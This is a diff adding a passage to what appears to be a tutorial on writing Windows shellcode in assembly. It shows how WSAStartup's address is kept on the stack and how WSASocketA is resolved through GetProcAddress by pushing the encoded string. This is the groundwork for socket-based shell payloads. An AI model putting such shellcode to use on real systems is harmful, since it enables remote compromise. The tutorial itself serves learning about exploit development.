@@ -270,4 +270,19 @@ lea esi, [esp]       ; esi will store WSAStartup location, and we'll calculate o
 
 So we pushed EAX onto the stack, therefore ESP was pointing at EAX. Then we put the address of ESP into ESI. So now we can refer to ESI and its offsets we create later to make the function calls. 
 
-To Be Continued...
+So for example, let's say the `WSAStartup` startup address is at `0x00000000`. We can store the next function at the address `0x00000004` and refer to it as `lea [esi + 0x4]`. Remember that since we made the `lea esi, [esp]` operation, ESI is just a location on the stack now. 
+
+Next, we'll do the exact same thing for `WSASocket`
+```nasm
+; use GetProcAddress to get location of WSASocketA
+push 0x61614174
+sub word [esp + 0x2], 0x6161
+push 0x656b636f
+push 0x53415357
+push esp
+push ecx
+call edi
+
+mov [esi + 0x4], eax          ; esi at offset 0x4 will now hold the address of WSASocketA
+```
+
